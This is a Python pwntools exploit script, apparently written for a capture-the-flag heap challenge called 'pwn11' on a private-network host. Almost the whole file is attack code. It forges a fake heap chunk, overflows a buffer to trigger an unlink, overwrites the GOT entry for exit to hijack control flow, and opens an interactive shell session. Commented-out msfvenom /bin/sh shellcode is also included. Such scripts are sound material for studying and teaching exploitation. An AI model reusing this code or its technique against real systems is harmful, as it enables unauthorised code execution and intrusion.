#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-14 00:23:55
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn11"
remote_ip = "192.168.5.82"
port = 8888
rop = roputils.ROP(target)
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	# gdb.attach(p,"b*0x04008AC\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def add(index):
	# ru("--\n")
	sl("1")
	# ru("reate:")
	sl(str(index))
def edit(index,length,data):
	# ru("--\n")
	sl("2")
	# ru(":")
	sl(str(index))
	# ru(":")
	sl(str(length))
	# ru(":")
	sd(data)
def dele(index):
	# ru("--\n")
	sl("3")
	# ru(":")
	sl(str(index))
def show(index):
	# ru("--\n")
	sl("2")
	# ru(":")
	sl(str(index))

# stage1 create chunk
add(0) #chunk0
add(1) #chunk1
add(2) #chunk2

# stage2 overflow chunk0
fake_header = p64(0)+p64(0x81)+p64(0x6012A0-0x18) + p64(0x6012A0-0x10)
payload = fake_header+"a"*(0x80-len(fake_header))+p64(0x80)+p64(0x90)
edit(0,len(payload),payload)
dele(1)
payload = "a" * 0x18 + p64(0x0000000000601288) + p64(rop.got('exit'))
edit(0,len(payload),payload)
payload = p64(0x4009B6)
edit(1,len(payload),payload)

# ru("----\n")
sl("5")

p.interactive()